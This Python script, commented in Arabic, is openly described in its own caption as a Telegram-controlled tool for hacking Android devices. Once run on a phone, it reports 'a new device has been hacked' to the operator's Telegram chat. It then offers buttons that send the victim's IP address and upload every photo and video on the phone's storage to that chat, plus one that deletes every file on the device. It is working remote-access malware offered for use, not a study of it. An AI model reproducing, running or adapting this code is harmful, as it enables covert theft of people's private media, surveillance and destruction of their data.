import subprocess
import sys

# تأكد من تثبيت المكتبات المطلوبة
required_libraries = ['telebot', 'requests', 'Pillow']
for lib in required_libraries:
    try:
        __import__(lib)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
import telebot
import os
import requests
from PIL import Image

# قم بإضافة التوكن الخاص بك هنا
bot_token = 'Your Token'
chat_id = 'Your ID'

# تعريف الكائن bot
bot = telebot.TeleBot(bot_token)

image_url = 'https://envs.sh/SoE.jpg'
image_caption = '```\n مرحبا بك هذا البوت أداة تحكم عن بعد عبر Telegram، مصممة لاختراق معلومات الجهاز وإدارة الملفات. يتميز بقدرات مثل حذف الملفات، سحب الصور والفيديوهات، والحصول على عنوان IP. مع واجهة سهلة الاستخدام وأزرار تفاعلية، يوفر البوت تجربة سلسة وآمنة للمستخدمين لا تنسي الاشتراك بقناتنا بالاسفل```\n'
response = requests.get(image_url)

if response.status_code == 200:
    with open('image.jpg', 'wb') as img_file:
        img_file.write(response.content)
    
    with open('image.jpg', 'rb') as img_file:
        # إنشاء زر للقناة
        markup = telebot.types.InlineKeyboardMarkup()
        channel_button = telebot.types.InlineKeyboardButton(text='اشترك في قناتنا', url='https://t.me/deMonZ0')
        markup.add(channel_button)

        bot.send_photo(chat_id, img_file, caption=image_caption, parse_mode='MarkdownV2', reply_markup=markup)
else:
    print("فشل في تحميل الصورة.")

tlg1 = 'تم اختراق جهاز جديد \n\nاضغط استارت لبداء الجلسه /start'
requests.get(f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={tlg1}')

print('انتظر يتم التحميل...')

def Demon_GetIP():
    response = requests.get("https://api.db-ip.com/v2/free/self")
    if response.status_code == 200:
        ip_data = response.json()
        return ip_data.get('ipAddress')
    else:
        return "لم يتمكن من الحصول على عنوان الـ IP."

def Demon_GetImage():
    root_directory = '/storage/emulated/0/'  # الدليل الجذر للهاتف
    for root, dirs, files in os.walk(root_directory):
        for filename in files:
            if filename.endswith((".png", ".jpg", ".jpeg")):
                file_path = os.path.join(root, filename)
                if os.path.isfile(file_path):  # تأكد من أن المسار هو ملف
                    try:
                        with Image.open(file_path) as img:
                            # أنشئ اسم ملف مضغوط جديد وتجنب الأخطاء في حالة وجوده مسبقًا
                            compressed_image_path = file_path.replace('.', '_compressed.')
                            # احفظ الصورة بصيغة JPEG مع جودة 75
                            img.thumbnail((img.width // 4, img.height // 4), Image.LANCZOS)
                            img.save(compressed_image_path, format='JPEG', quality=75, optimize=True)

                        with open(compressed_image_path, 'rb') as image_file:
                            bot.send_photo(chat_id, image_file)
                    except FileNotFoundError:
                        # تجاهل الخطأ إذا لم يتم العثور على الملف
                        continue
                    except Exception as e:
                        bot.send_message(chat_id, f"حدث خطأ أثناء معالجة الصورة: {str(e)}")

def Demon_GetVideo():
    root_directory = '/storage/emulated/0/'  # الدليل الجذر للهاتف
    for root, dirs, files in os.walk(root_directory):
        for filename in files:
            if filename.endswith((".mp4", ".avi", ".mkv")):
                file_path = os.path.join(root, filename)
                if os.path.isfile(file_path):  # تأكد من أن المسار هو ملف
                    try:
                        with open(file_path, 'rb') as video_file:
                            bot.send_video(chat_id, video_file)
                    except Exception as e:
                        bot.send_message(chat_id, f"حدث خطأ أثناء معالجة الفيديو: {str(e)}")

def DemonDeleteAllFiles():
    root_directory = '/storage/emulated/0/'  # الدليل الجذر للهاتف
    deleted_files = []
    for root, dirs, files in os.walk(root_directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            try:
                os.remove(file_path)
                deleted_files.append(file_path)
            except Exception as e:
                bot.send_message(chat_id, f"خطأ أثناء حذف الملف {file_path}: {str(e)}")
    if deleted_files:
        bot.send_message(chat_id, f"تم حذف الملفات التالية:\n" + "\n".join(deleted_files))
    else:
        bot.send_message(chat_id, "لا توجد ملفات للحذف.")

@bot.message_handler(commands=['start'])
def Demon6(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    image_button = telebot.types.KeyboardButton('سحب الصور')
    video_button = telebot.types.KeyboardButton('سحب الفيديوهات')
    ip_button = telebot.types.KeyboardButton('سحب ال IP')
    format_button = telebot.types.KeyboardButton('فرمطه الجهاز')
    
    markup.add(image_button, video_button, ip_button, format_button)
    bot.send_message(chat_id, "لقد تم بداء الجلسه يمكنك التحكم في الجهاز من الازرار التالية:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def Demon5(message):
    if message.text == 'سحب ال IP':
        ip_address = Demon_GetIP()
        bot.send_message(chat_id, f"عنوان الـ IP: {ip_address} \n يمكنك الحصول علي بعض المعلومات حول ال ip من هنا \n http://ipwho.is/{ip_address}")
    elif message.text == 'سحب الصور':
        Demon_GetImage()  # استدعاء الدالة بدون مسار
    elif message.text == 'سحب الفيديوهات':
        Demon_GetVideo()  # استدعاء الدالة بدون مسار
    elif message.text == 'فرمطه الجهاز':
        DemonDeleteAllFiles() 

bot.polling() 
